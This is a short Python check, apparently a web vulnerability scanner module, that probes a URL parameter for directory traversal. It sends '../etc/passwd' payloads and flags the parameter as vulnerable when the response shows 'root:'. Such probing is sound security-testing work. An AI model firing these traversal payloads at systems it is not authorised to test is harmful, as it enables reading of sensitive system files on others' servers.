def run(client, url, param, reporter):

    payloads = [
        "../etc/passwd",
        "../../etc/passwd"
    ]

    for payload in payloads:
        r = client.send(url, params={param: payload})

        if r and "root:" in r.text:
            reporter.add("Directory Traversal", param, payload, "HIGH")
            print(f"[Traversal] {param} vulnerable")